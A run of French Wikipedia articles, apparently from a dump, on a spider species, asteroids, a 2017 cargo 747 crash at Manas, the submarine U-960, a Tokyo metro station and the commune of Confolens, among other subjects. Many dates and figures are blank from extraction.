Special Edition.
CD 1
CD 2 

</doc>
<doc id="10576064" url="https://fr.wikipedia.org/wiki?curid=10576064" title="Guadana manauara">
Guadana manauara

Guadana manauara est une espèce d'araignées aranéomorphes de la famille des Sparassidae.
Distribution.
Cette espèce est endémique du Brésil. Elle se rencontre en Amazonas et en Acre.
Description.
Le mâle holotype mesure et la femelle paratype , les mâles mesurent de à et les femelles de à .
Étymologie.
Son nom d'espèce lui a été donné en référence au lieu de sa découverte, Manaus.

</doc>
<doc id="10576069" url="https://fr.wikipedia.org/wiki?curid=10576069" title="Le Printemps (film, 1970)">
Le Printemps (film, 1970)

Le Printemps est un film français réalisé par Marcel Hanoun, sorti en 1971.
Synopsis.
Un homme court dans les bois et les champs, il semble se cacher. Nous ne savons pas la raison de sa fuite et son nom n'est pas évoqué. Les scènes avec cet homme sont filmées en noir et blanc, certaines en couleurs, sont entrecoupées de scènes quotidiennes d'une fille pré-adolescente chez sa grand-mère. Celles-ci ne rencontrent jamais l'homme. Il y a très peu de dialogues échangés dans le film. Un conte est raconté en partie par la fille et par un narrateur.

</doc>
<doc id="10576074" url="https://fr.wikipedia.org/wiki?curid=10576074" title="AT 408">
AT 408



</doc>
<doc id="10576081" url="https://fr.wikipedia.org/wiki?curid=10576081" title="Mihai Viteazul (film)">
Mihai Viteazul (film)



</doc>
<doc id="10576090" url="https://fr.wikipedia.org/wiki?curid=10576090" title="Chazallon">
Chazallon



</doc>
<doc id="10576097" url="https://fr.wikipedia.org/wiki?curid=10576097" title="Église Saint-Martin de Bourdon">
Église Saint-Martin de Bourdon

L'église Saint-Martin de Bourdon est située à Bourdon dans le département de la Somme, sur la rive droite de la Somme, entre Amiens et Abbeville dans la région des Hauts-de-France.
Historique.
L'église, consacrée à saint Martin, est construite en pierre avec des soubassements en grès, elle possède une tour-clocher du siècle surmontée d'une flèche en pierre. La nef a été achevée en 1825. Le clocher est protégé au titre des monuments historiques : inscription par arrêté du .
Caractéristiques.
La tour-porche datant de 1719, renforcée par des contreforts à chaque angle, est surmontée d'un clocher coiffé d’une flèche de style gothique ornée de crochets sur les arêtes et de lucarnes comme d'autres églises de la vallée de la Somme.
L'église conserve un certain nombre d'objets protégés en tant que monuments historiques :
Auxquels s'ajoutent :

</doc>
<doc id="10576101" url="https://fr.wikipedia.org/wiki?curid=10576101" title="Accident d'un 747 cargo au Kirghizistan">
Accident d'un 747 cargo au Kirghizistan

L'accident d'un 747 cargo au Kirghizistan s'est produit le , lorsqu'un Boeing 747-400 assurant le vol Turkish Airlines 6491 (TK 6491) s'est écrasé dans une zone résidentielle, alors qu'il tentait d'atterrir dans un épais brouillard à l'aéroport international de Manas, au Kirghizistan, provoquant la mort des 4 membres d'équipage ainsi que de 35 autres personnes au sol.
Exploité par la compagnie , pour le compte de Turkish Airlines Cargo, ce vol cargo international régulier devait relier Hong Kong à Istanbul, en Turquie, avec une escale prévue à Bichkek, capitale du Kirghizistan.
L'enquête qui a suivi a révélé que l'avion n'a pas réussi à acquérir correctement le signal du système d'atterrissage aux instruments (ILS), restant nettement plus haut que la trajectoire d'approche normale tout en survolant toute la longueur de la piste ; il est ensuite entré en collision avec des maisons quelques secondes après avoir amorcé une remise de gaz.
Avion et équipage.
L'appareil impliqué est un Boeing 747-412F, immatriculé TC-MCL (numéro de série 32897/1322) et propulsé par quatre turboréacteurs double flux Pratt &amp; Whitney PW4056. Il cumulait 46 820 heures de vol et 8 308 cycles (décollage/atterrissage) au moment de l'accident.
Il est entré en service auprès de Singapore Airlines Cargo en 2003, sous l'immatriculation 9V-SFL. Après plusieurs périodes de stockage, l'avion a été acquis par "LCI Aviation" en 2015. Il a ensuite été loué à la compagnie de fret turque , basée à Istanbul, qui a ensuite commencé à l'exploiter pour le compte de Qatar Airways Cargo, suivie de Turkish Airlines Cargo à partir de 2017. Sa dernière visite de type C avait été effectué le .
L'équipage du vol 6491 est composé du commandant de bord Ibrahim Diranci et du copilote Kazim Ondul (tous deux âgés de 59 ans), ainsi que du responsable de chargement Ihsan Koca et du mécanicien Melih Aslan.
Accident.
À 07h19, heure locale, le vol 6491 s'est écrasé à près d'un kilomètre (3 300 pieds) au-delà de l'extrémité de la piste 26 de l'aéroport international de Manas, dans un épais brouillard.
Selon les premiers rapports, le 747 n'a pas réussi à prendre suffisamment d'altitude lors d'une tentative de remise de gaz. Il s'est écrasé à grande vitesse sur le sol, entrant en collision avec une clôture en béton, située au bout de l'aéroport, avant de détruire plusieurs maisons dans une zone résidentielle. L'avion s'est disloqué sous la violence du choc et le carburant déversé au sol a pris feu rapidement après le crash.
Les autorités kirghizes ont déclaré plus tard que l'équipage tentait résolument d'atterrir, au lieu d'interrompre l'atterrissage.
Bilan.
Au total, 39 personnes ont été tuées lors de l'accident : les quatre membres de l'équipage et 35 habitants de "Dacha-SU", un quartier résidentiel situé à environ à l'ouest de l'aéroport. Parmi les victimes se trouvaient 7 hommes, 10 femmes et 17 enfants.
Des témoins et des sauveteurs ont rapporté avoir trouvé le commandant de bord toujours conscient, attaché à son siège, dont il a fallu le détacher. Il est décédé plus tard, alors qu'il était en route vers un hôpital.
Quatorze personnes au sol ont également été blessées, dont plusieurs enfants. Dix-neuf maisons ont été détruites lors du crash et sept autres ont été gravement endommagées. L'aéroport international de Manas a rapidement été fermé et tous les vols ont été annulés peu de temps après l'accident.
Enquête.
La cause de l'accident du vol 6491 n'était pas immédiatement claire. Le ministre des Situations d'urgence du Kirghizistan, Kubatbek Boronov, a déclaré qu'il y avait du brouillard à Bichkek au moment de l'accident, mais que les conditions météorologiques n'étaient pas considérés comme critiques. Dans l'après-midi du 16 janvier, l'un des deux enregistreurs de vol a été retrouvé et l'autre a été localisé plus tard au cours du processus de récupération. L'enregistreur de paramètres (FDR) et l'enregistreur phonique (CVR) ont été endommagés lors de l'accident, mais les enquêteurs ont quand même pu récupérer les données des deux enregistreurs.
Le vice-Premier ministre Muhammetkaly Abulgazev a suggéré que la cause de cet accident pourrait être une erreur de pilotage, soulignant que onze autres avions avaient atterri en toute sécurité, dans les mêmes conditions météorologiques, la veille du crash. Il a également ajouté que l'avion avait tenté d'atterrir à deux reprises et avait endommagé les feux de piste à un moment donné. Cette déclaration était en contradiction avec une autre déclaration officielle, selon laquelle l'avion s'est écrasé lors de sa première tentative d'atterrissage.
L'Interstate Aviation Committee (IAC), ou « Comité inter-étatique sur l'aviation », a ouvert une enquête technique.
Le a déclaré qu'il avait envoyé deux experts de son comité d'enquête sur les accidents à Bichkek pour aider les autorités kirghizes. Une équipe technique de Boeing, le constructeur de l'appareil, s'est rendue sur place pour offrir aide et conseils, sous les auspices de l'organisme américain d'enquête sur les accidents, le Conseil national de la sécurité des transports (NTSB).
De nombreuses premières réactions dans la presse indiquaient qu'un avion de Turkish Airlines était impliqué dans l'accident. En réponse, la compagnie aérienne a publié une déclaration affirmant que ni l'avion, ni l'équipage ne faisaient partie de la compagnie aérienne. Les journalistes ont alors été menacés par des avocats turcs, alléguant une atteinte à leur réputation. Néanmoins, le vol était opéré sous un numéro de vol de Turkish Airlines (TK 6491).
Le rapport d'enquête préliminaire a révélé que l'avion a entamé son approche trop tardivement, et a capturé par inadvertance une fausse pente de descente. Après l'avoir capturé, les trois systèmes du pilote automatique du 747 ont alors initié la descente, dans des conditions de faible visibilité. Initialement, les trois systèmes étaient engagés (LAND 3). La fausse pente de descente a été perdue 15 secondes après son acquisition, et les indications "AP CAUTION" et "FMA FAULT 2" ont été enregistrés par le FDR, indiquant que le pilotes automatique continuerait à faire descendre l'avion en suivant une pente de descente de 3°, en utilisant le guidage inertiel. Puis, un des systèmes s'est désengagé (LAND 2) et les deux systèmes restants ont continué de faire voler l'avion jusqu'à la hauteur de décision, qui est alors de 99 pieds (30 m). L'équipage n'a ensuite pas acquis les références visuelles extérieures requise une fois arriver à la hauteur de décision, et a initié une remise de gaz quelques instants plus tard, à une altitude de 58 pieds (17 m), en appuyant sur le Takeoff/go-around switch (TO/GA). Étant donné que le terrain était légèrement en pente après la fin de la piste, l'avion n'avait pas suffisamment d'altitude à ce moment-là pour remonter en toute sécurité.
Rapport final.
Le , l'IAC a publié son rapport final sur l'accident du vol 6491, indiquant que la cause probable du crash est la perte de contrôle, par les pilotes, de la position de l'avion par rapport à la trajectoire de descente lors de l'approche aux instruments, effectuée de nuit et dans des conditions météorologiques propices à un atterrissage de catégorie II, d'après les normes de l'Organisation de l'aviation civile internationale (OACI). Le rapport énumère également de nombreux autres facteurs ayant contribué à l'accident.
Le , la presse kirghize a rapporté qu’ a déclaré son intention de verser aux victimes une indemnisation pour toutes les pertes matérielles et immatérielles, citant un communiqué de presse publié sur le site officiel de la compagnie aérienne. Le communiqué de presse lui-même indique cependant que seules les pertes étaient couvertes par l’assurance.

</doc>
<doc id="10576102" url="https://fr.wikipedia.org/wiki?curid=10576102" title="(6406) Mikejura">
(6406) Mikejura

(6406) Mikejura est un astéroïde de la ceinture principale.
Nom.
L'astéroïde est nommé d'après Michael Jura (1947-2016), astronome américain et professeur à l'Université de Californie à Los Angeles dont le travail sur les naines blanches polluées a permis la première mesure de la composition chimique d'astéroïdes extrasolaires.
Description.
(6406) Mikejura est un astéroïde de la ceinture principale. Il fut découvert le à l'observatoire Palomar par Henry E. Holt. Il présente une orbite caractérisée par un demi-grand axe de 2,28 UA, une excentricité de 0,18 et une inclinaison de 8,2° par rapport à l'écliptique.

</doc>
<doc id="10576103" url="https://fr.wikipedia.org/wiki?curid=10576103" title="(6466) Drewesquivel">
(6466) Drewesquivel

(6466) Drewesquivel est un astéroïde de la ceinture principale.
Description.
(6466) Drewesquivel est un astéroïde de la ceinture principale. Il fut découvert le à Siding Spring par Eleanor Francis Helin et Schelte J. Bus. Il présente une orbite caractérisée par un demi-grand axe de 2,56 UA, une excentricité de 0,12 et une inclinaison de 13,8° par rapport à l'écliptique.

</doc>
<doc id="10576104" url="https://fr.wikipedia.org/wiki?curid=10576104" title="(7156) Flaviofusipecci">
(7156) Flaviofusipecci

(7156) Flaviofusipecci est un astéroïde de la ceinture principale.
Description.
(7156) Flaviofusipecci est un astéroïde de la ceinture principale. Il fut découvert le à La Silla par Giovanni de Sanctis et Henri Debehogne. Il présente une orbite caractérisée par un demi-grand axe de 2,68 UA, une excentricité de 0,14 et une inclinaison de 11,1° par rapport à l'écliptique.

</doc>
<doc id="10576105" url="https://fr.wikipedia.org/wiki?curid=10576105" title="(9649) Junfukue">
(9649) Junfukue

(9649) Junfukue est un astéroïde de la ceinture principale.
Description.
(9649) Junfukue est un astéroïde de la ceinture principale. Il fut découvert le à Oizumi par Takao Kobayashi. Il présente une orbite caractérisée par un demi-grand axe de 2,23 UA, une excentricité de 0,15 et une inclinaison de 4,0° par rapport à l'écliptique.

</doc>
<doc id="10576106" url="https://fr.wikipedia.org/wiki?curid=10576106" title="(9791) Kamiyakurai">
(9791) Kamiyakurai

(9791) Kamiyakurai est un astéroïde de la ceinture principale.
Description.
(9791) Kamiyakurai est un astéroïde de la ceinture principale. Il fut découvert le à Oizumi par Takao Kobayashi. Il présente une orbite caractérisée par un demi-grand axe de 2,30 UA, une excentricité de 0,07 et une inclinaison de 8,8° par rapport à l'écliptique.

</doc>
<doc id="10576108" url="https://fr.wikipedia.org/wiki?curid=10576108" title="(9792) Nonodakesan">
(9792) Nonodakesan

(9792) Nonodakesan est un astéroïde de la ceinture principale.
Description.
(9792) Nonodakesan est un astéroïde de la ceinture principale. Il fut découvert le à Oizumi par Takao Kobayashi. Il présente une orbite caractérisée par un demi-grand axe de 2,36 UA, une excentricité de 0,15 et une inclinaison de 11,2° par rapport à l'écliptique.

</doc>
<doc id="10576109" url="https://fr.wikipedia.org/wiki?curid=10576109" title="(9804) Shrikulkarni">
(9804) Shrikulkarni

(9804) Shrikulkarni est un astéroïde de la ceinture principale.
Description.
(9804) Shrikulkarni est un astéroïde de la ceinture principale. Il fut découvert le lors d'un relevé du Wide-field Infrared Survey Explorer par Eran O. Ofek. Il présente une orbite caractérisée par un demi-grand axe de 2,67 UA, une excentricité de 0,12 et une inclinaison de 13,5° par rapport à l'écliptique.

</doc>
<doc id="10576110" url="https://fr.wikipedia.org/wiki?curid=10576110" title="(9977) Kentakunimoto">
(9977) Kentakunimoto

(9977) Kentakunimoto est un astéroïde de la ceinture principale.
Description.
(9977) Kentakunimoto est un astéroïde de la ceinture principale. Il fut découvert le à Oizumi par Takao Kobayashi. Il présente une orbite caractérisée par un demi-grand axe de 2,94 UA, une excentricité de 0,07 et une inclinaison de 2,8° par rapport à l'écliptique.

</doc>
<doc id="10576111" url="https://fr.wikipedia.org/wiki?curid=10576111" title="(10791) Uson">
(10791) Uson

(10791) Uson est un astéroïde de la ceinture principale.
Description.
(10791) Uson est un astéroïde de la ceinture principale. Il fut découvert le à Geisei par Tsutomu Seki. Il présente une orbite caractérisée par un demi-grand axe de 3,24 UA, une excentricité de 0,08 et une inclinaison de 23,6° par rapport à l'écliptique.

</doc>
<doc id="10576112" url="https://fr.wikipedia.org/wiki?curid=10576112" title="(11294) Kazu">
(11294) Kazu

(11294) Kazu est un astéroïde de la ceinture principale.
Description.
(11294) Kazu est un astéroïde de la ceinture principale. Il fut découvert le à Geisei par Tsutomu Seki. Il présente une orbite caractérisée par un demi-grand axe de 2,29 UA, une excentricité de 0,15 et une inclinaison de 6,3° par rapport à l'écliptique.

</doc>
<doc id="10576113" url="https://fr.wikipedia.org/wiki?curid=10576113" title="(12663) Björkegren">
(12663) Björkegren

(12663) Björkegren est un astéroïde de la ceinture principale.
Description.
(12663) Björkegren est un astéroïde de la ceinture principale. Il fut découvert le à La Silla par Claes-Ingvar Lagerkvist. Il présente une orbite caractérisée par un demi-grand axe de 2,91 UA, une excentricité de 0,07 et une inclinaison de 1,1° par rapport à l'écliptique.

</doc>
<doc id="10576114" url="https://fr.wikipedia.org/wiki?curid=10576114" title="(12749) Odokaigan">
(12749) Odokaigan

(12749) Odokaigan est un astéroïde de la ceinture principale.
Description.
(12749) Odokaigan est un astéroïde de la ceinture principale. Il fut découvert le à Geisei par Tsutomu Seki. Il présente une orbite caractérisée par un demi-grand axe de 2,34 UA, une excentricité de 0,13 et une inclinaison de 5,4° par rapport à l'écliptique.

</doc>
<doc id="10576120" url="https://fr.wikipedia.org/wiki?curid=10576120" title="Maisons des maîtres de barques">
Maisons des maîtres de barques



</doc>
<doc id="10576122" url="https://fr.wikipedia.org/wiki?curid=10576122" title="Edogawabashi (métro de Tokyo)">
Edogawabashi (métro de Tokyo)

 est une station du métro de Tokyo sur la ligne Yūrakuchō dans l'arrondissement de Bunkyō à Tokyo. Elle est exploitée par le Tokyo Metro.
La station.
La station se compose d'un quai central encadré par les 2 voies de la ligne Yūrakuchō.
En moyenne, ont fréquenté quotidiennement la station en 2015.
Histoire.
La station a été inaugurée le .

</doc>
<doc id="10576127" url="https://fr.wikipedia.org/wiki?curid=10576127" title="José Greci">
José Greci

Giuseppina Greci, dite José Greci, née le à Ferrare et morte le à Rome, est une actrice italienne.
Biographie.
José Greci est la fille du journaliste de télévision et écrivain Luigi Greci. En 1956, âgée d'à peine quinze ans, elle rentre à l'Académie nationale d'art dramatique Silvio D'Amico, qu'elle quitte au bout de deux ans, pour faire ses débuts sur scène. L'un de ses premiers rôle au cinéma, est celui de la Vierge Marie dans "Ben-Hur".
Elle commence alors à apparaître dans de nombreux films de genre, devenant bientôt l'une des actrices les plus prolifiques du cinéma italien des années 1960 et plus particulièrement, une star des péplums et films italiens d'espionnage. Elle se tourne également vers la télévision mais abandonne progressivement sa carrière dans les années 1970.

</doc>
<doc id="10576128" url="https://fr.wikipedia.org/wiki?curid=10576128" title="Unterseeboot 960">
Unterseeboot 960

L'Unterseeboot 960 ou U-960 est un sous-marin allemand (U-Boot) de type VIIC utilisé par la Kriegsmarine pendant la Seconde Guerre mondiale.
Le sous-marin fut commandé le à Hambourg (Blohm + Voss), sa quille fut posée le , il fut lancé le et mis en service le , sous le commandement de l"'Oberleutnant zur See" Günther Heinrich.
Il fut coulé par la marine américaine, l'aviation britannique et américaine en Méditerranée en .
Conception.
Unterseeboot type VII, l"'U-960" avait un déplacement de en surface et en plongée. Il avait une longueur totale de , un maître-bau de , une hauteur de et un tirant d'eau de . Le sous-marin était propulsé par deux hélices de , deux moteurs diesel Germaniawerft "M6V 40/46" de en ligne de à , produisant un total de à en surface et de deux moteurs électriques Brown, Boveri &amp; Cie "GG UB 720/8" de 375 cv à 295 tr/min, produisant un total , en plongée. Le sous-marin avait une vitesse en surface de () et une vitesse de () en plongée. Immergé, il avait un rayon d'action de marins () à (; par heure) et pouvait atteindre une profondeur de . En surface son rayon d'action était de nautiques (soit ) à ().
L"U-960" était équipé de cinq tubes lance-torpilles de (quatre montés à l'avant et un à l'arrière) et embarquait quatorze torpilles. Il était équipé d'un canon de 8,8 cm SK C/35 (220 coups) et d'un canon antiaérien de Flak. Il pouvait transporter 26 mines "TMA" ou "TMB". Son équipage comprenait et .
Historique.
Il reçut sa formation de base au sein de la 5. Unterseebootsflottille jusqu'au , puis il intégra sa formation de combat dans la 3. Unterseebootsflottille.
Sa première patrouille est précédée par de courts trajets de Kiel, Bergen et Narvik. Elle commence réellement le au départ de Narvik. D'une durée de 15 jours, l"'U-960" patrouille en mer de Barents sans succès.
Sa troisième patrouille se déroule du au , soit 27 jours en mer. L"U-960" opère dans les eaux Arctiques, jusqu'en mer de Kara. Le à , l"'U-960" lance une attaque contre convoi "VA-18" à 40 miles à l'ouest de l'île Rousski. Le navire soviétique "Arkhangel´sk" fut touché dans la cale numéro 2, le navire se brisa en deux et coula en cinq minutes, emportant 17 des 42 membres d'équipage. Les survivants ont été secourus par le dragueur de mine soviétique "T-886 (n°31)".
Le lendemain à , le sous-marin lança une deuxième attaque sur le convoi et il coula un navire de patrouille soviétique à 58 miles au nord-ouest de la . En raison de l'obscurité et de la menace d'une autre attaque de sous-marins, aucune tentative de sauvetage n'a été entreprise par les autres navires du convoi. La totalité des 43 marins périrent.
Après un passage à Trondheim, l"U-960" commence sa troisième patrouille le . Le sous-marin passe par la ligne GIUK et patrouille dans le trou noir de l'Atlantique. Le , l"U-960" repère un navire marchand, traînard du convoi "ON-219" à environ 900 milles à l'est du détroit de Belle Isle. L'U-Boot le torpille une première fois à . Une heure plus tard, il lui lance deux autres torpilles. Plus tard dans la nuit, l"'U-960" lui tire deux coups de grâce qui le brisent en deux. Il n'y a pas de survivants. Après 62 jours en mer, il rejoint son port d'attache de La Pallice qu'il atteint le .
Sa quatrième patrouille commence le . Le , l"U-763" et l"U-960" sont attaqués par sept avions bombardiers "Mosquitos" (deux "Mk.XVIII" du "618 Sqdn" et cinq "Mk.VI" du "248 Sqdn" RAF) alors qu'ils étaient à un point de rendez-vous avec deux "dragueurs de mines" et quatre autres dragueurs de mines. Durant l'attaque, un homme d'équipage est tué et quatorze autres sous-mariniers, blessés, dont quatre gravement, y compris le commandant avec une blessure au-dessus du genou gauche. L"'U-960" est contraint d'abandonner la patrouille en raison des pertes subies.
Il reprend la mer pour sa cinquième patrouille pour la Méditerranée le . Il double Gibraltar dans la nuit du .&lt;br&gt; Le , cinq heures après le naufrage de l"U-616" au nord-ouest de Ténès, l"'U-960" attaque sans succès le destroyer américain au nord-ouest d'Alger. À ce moment-là, le destroyer abrite des survivants de l"U-616" à son bord.
À la suite de cette attaque, l"'U-960" est chassé sans relâche jusqu'au , date à laquelle il est coulé au nord-ouest d'Alger, à la position , par des charges de profondeur des destroyers américains , , deux Wellington britanniques du "36 Sqn RAF M &amp; U" et un Ventura britannique du "500 Sqn RAF / V". 
31 des 51 membres d'équipage meurent dans cette attaque.
Patrouilles.
Opérations "Wolfpack".
L"'U-960" a opéré avec les "Wolfpacks" (meute de loups) durant sa carrière opérationnelle.
Navires coulés.
L"'U-960" a coulé 2 navires marchands totalisant tonneaux et 1 navire de guerre auxiliaire de tonneaux au cours des 5 patrouilles (150 jours en mer) qu'il effectua.

</doc>
<doc id="10576146" url="https://fr.wikipedia.org/wiki?curid=10576146" title="Antoine-Marie Chazallon">
Antoine-Marie Chazallon

Antoine Marie Rémi Chazallon, né le 17 nivôse an X () à Désaignes (Ardèche) où il est mort le , est un ingénieur hydrographe et homme politique français.
Sorti de l'École polytechnique en 1824, il devient ingénieur hydrographe au Dépôt des Cartes et plans de la Marine et participe à la réalisation du « pilote français ». Il est à l'initiative de l'annuaire des marées de France. Il est élu député de l'Ardèche de 1848 à 1849, siégeant avec les républicains modérés.
Biographie.
Antoine-Marie-Rémi Chazallon naît le 7 janvier 1802 à Désaignes, en Ardèche. Il est le fils d’Étienne Chazallon et de Marguerite Patouillard.
Il entre à l'École polytechnique en 1822 et en sort ingénieur hydrographe en 1824. Il travaille alors aux côtés de Beautemps-Beaupré à la levée des côtes de l'Atlantique et de la Manche.
Élu député de l'Ardèche en 1848, il n'est pas réélu par la suite.
Spécialiste de l'étude des marées, il est l'inventeur du marégraphe et édita de 1838 à 1862 l"'Annuaire des marées des côtes de France".
Correspondant de l'Académie des sciences (), il prend sa retraite en . Il meurt le 23 décembre 1872 à Désaignes, sa ville natale.

</doc>
<doc id="10576149" url="https://fr.wikipedia.org/wiki?curid=10576149" title="Sargent Johnson">
Sargent Johnson



</doc>
<doc id="10576156" url="https://fr.wikipedia.org/wiki?curid=10576156" title="Les Mégret gèrent la ville">
Les Mégret gèrent la ville



</doc>
<doc id="10576159" url="https://fr.wikipedia.org/wiki?curid=10576159" title="Boca del Rosario">
Boca del Rosario

 Boca del Rosario est une localité uruguayenne située dans le département de Colonia.
Localisation.
Boca del Rosario se situe au sud-est du département de Colonia, à proximité de l’embouchure du río Rosario dans le Río de la Plata.
Population.
La localité compte 12 habitants permanents d'après le recensement de 2011. Mais la population augmente en été, avec la saison touristique.

</doc>
<doc id="10576169" url="https://fr.wikipedia.org/wiki?curid=10576169" title="Jay Fulton">
Jay Fulton

Jay Fulton, né le à Bolton (Angleterre), est un footballeur écossais qui évolue au poste de milieu de terrain à Swansea City.
Biographie.
En club.
Formé au Falkirk FC, Jay Fulton dispute sa première rencontre au niveau professionnel face à Partick Thistle le . Il dispute cent-sept matchs et inscrit neuf buts avec le club écossais avant de s'engager pour deux ans et demi avec Swansea City le .
Le , il joue sa première rencontre avec les "Swans" à l'occasion d'un match de Premier League face à Aston Villa (victoire 4-1). En , il est prêté pour trois mois à Oldham Athletic, qui évolue en D3 anglaise. Il prend part à onze matchs avant de réintégrer l'effectif de Swansea City en . De retour au pays de Galles, il participe à deux matchs de Premier League lors de la seconde partie de saison 2015-2016.
Le , le milieu écossais inscrit son premier but sous le maillot de Swansea lors d'une rencontre de Coupe de la Ligue anglaise face à Peterborough United (victoire 1-3).
Le , Jay Fulton est prêté à Wigan Athletic jusqu'à la fin de la saison.

</doc>
<doc id="10576175" url="https://fr.wikipedia.org/wiki?curid=10576175" title="Confolens">
Confolens

Confolens (prononcé ) est une commune du Centre-Ouest de la France située dans le département de la Charente, en région Nouvelle-Aquitaine. Réputée pour son Festival, Confolens est une des deux sous-préfectures de la Charente et la ville la plus importante de la Charente limousine.
La commune nouvelle de Confolens a été créée le à la suite de la fusion de l'ancienne commune de Confolens et de sa voisine Saint-Germain-de-Confolens ; les deux communes fusionnées devenant communes déléguées.
Géographie.
Les informations relatives à la géographie de cette commune sont la fusion des informations des deux communes fusionnées.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique altéré, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols, etc.) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfa, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été chaud sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Poitou-Charentes, caractérisée par un bon ensoleillement, particulièrement en été et des vents modérés. Elle est en outre dans la zone H2b au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Saulgond à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Pour afficher une liste d’indicateurs climatiques caractérisant la commune aux horizons 2030, 2050 et 2100 et pouvoir ainsi s'adapter aux changements climatiques, entrer son nom dans Climadiag-commune, un site de Météo-France élaboré à partir des nouvelles projections climatiques de référence DRIAS-2020.
Urbanisme.
Typologie.
Au , Confolens est catégorisée bourg rural, selon la nouvelle grille communale de densité à définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Confolens, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Confolens, dont elle est la commune-centre. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Risques majeurs.
Le territoire de la commune de Confolens est vulnérable à différents aléas naturels : météorologiques (tempête, orage, neige, grand froid, canicule ou sécheresse), inondations et séisme (sismicité faible). Il est également exposé à deux risques technologiques, le transport de matières dangereuses et la rupture d'un barrage, et à un risque particulier : le risque de radon. Un site publié par le BRGM permet d'évaluer simplement et rapidement les risques d'un bien localisé soit par son adresse soit par le numéro de sa parcelle.
Risques naturels.
Certaines parties du territoire communal sont susceptibles d’être affectées par le risque d’inondation par débordement de cours d'eau, notamment la Vienne, le Goire et l'Issoire. La commune a été reconnue en état de catastrophe naturelle au titre des dommages causés par les inondations et coulées de boue survenues en 1982, 1983, 1993, 1995 et 1999.
Le retrait-gonflement des sols argileux est susceptible d'engendrer des dommages importants aux bâtiments en cas d’alternance de périodes de sécheresse et de pluie. 13,1 % de la superficie communale est en aléa moyen ou fort (67,4 % au niveau départemental et 48,5 % au niveau national). Sur les dénombrés sur la commune en 2019, 336 sont en aléa moyen ou fort, soit 23 %, à comparer aux 81 % au niveau départemental et 54 % au niveau national. Une cartographie de l'exposition du territoire national au retrait gonflement des sols argileux est disponible sur le site du BRGM.
Par ailleurs, afin de mieux appréhender le risque d’affaissement de terrain, l'inventaire national des cavités souterraines permet de localiser celles situées sur la commune.
Concernant les mouvements de terrains, la commune a été reconnue en état de catastrophe naturelle au titre des dommages causés par la sécheresse en 2005 et 2018 et par des mouvements de terrain en 1999.
Risques technologiques.
Le risque de transport de matières dangereuses sur la commune est lié à sa traversée par une ou des infrastructures routières ou ferroviaires importantes ou la présence d'une canalisation de transport d'hydrocarbures. Un accident se produisant sur de telles infrastructures est susceptible d’avoir des effets graves sur les biens, les personnes ou l'environnement, selon la nature du matériau transporté. Des dispositions d’urbanisme peuvent être préconisées en conséquence.
La commune est en outre située en aval des barrages de Lavaud-Gelade et Vassivière, des ouvrages de classes A. À ce titre elle est susceptible d’être touchée par l’onde de submersion consécutive à la rupture de cet ouvrage.
Risque particulier.
Dans plusieurs parties du territoire national, le radon, accumulé dans certains logements ou autres locaux, peut constituer une source significative d’exposition de la population aux rayonnements ionisants. Certaines communes du département sont concernées par le risque radon à un niveau plus ou moins élevé. Selon la classification de 2018, la commune de Confolens est classée en zone 3, à savoir zone à potentiel radon significatif.
Toponymie.
Toponyme.
Les formes anciennes sont "Confolentis" en 1025-1028, "Confluento" (non daté).
Confolens est située au confluent de la Vienne et du Goire. Cette situation est à l'origine de son nom, du latin "confluens", comme de nombreux autres lieux en France (Couflens, Couffoulens, Conflent, , etc.).
Langues.
La commune est dans la partie occitane de la Charente qui en occupe le tiers oriental, et le dialecte est limousin.
En occitan, elle se nomme "Confolent" ou "Confolens".
Histoire.
La région était peuplée dès l'époque préhistorique, comme en témoignent de nombreux monuments mégalithiques. Mais il n'est fait mention de Confolens qu'au .
Confolens était située sur l'ancienne voie romaine d'Angoulême à Bourges par Argenton, à l'endroit où elle traversait la Vienne. L'hypothèse d'un pont antique à l'emplacement du "Pont Vieux" a été émise, à la suite de la découverte de vestiges au .
Au Moyen Âge, Confolens était sur un itinéraire transversal d'un chemin de Saint-Jacques-de-Compostelle, qui se dirigeait du Limousin vers Angoulême pour bifurquer vers Saintes (reliques de saint Eutrope), Blanzac (vers Blaye) ou Aubeterre (vers Sainte-Foy-la-Grande).
L'agglomération de Confolens a été créée par les seigneurs "princes" de Chabanais, et elle était séparée en deux par la Vienne et chaque rive dépendait d'un diocèse différent, Limoges à l'est, Poitiers à l'ouest. Cette organisation en deux diocèses est extrêmement rare : elle montre bien la situation de ville-frontière.
Au puis au , des fortifications furent édifiées à partir du château pour protéger la principauté de ses puissants voisins : les comtes de la Marche, d'Angoulême et du Poitou, aussi les La Rochefoucauld et les Rochechouart. Confolens fut le siège d'une commanderie de l'ordre des Hospitaliers du Saint-Esprit aux ; la chapelle a servi aux pénitents blancs en 1656.
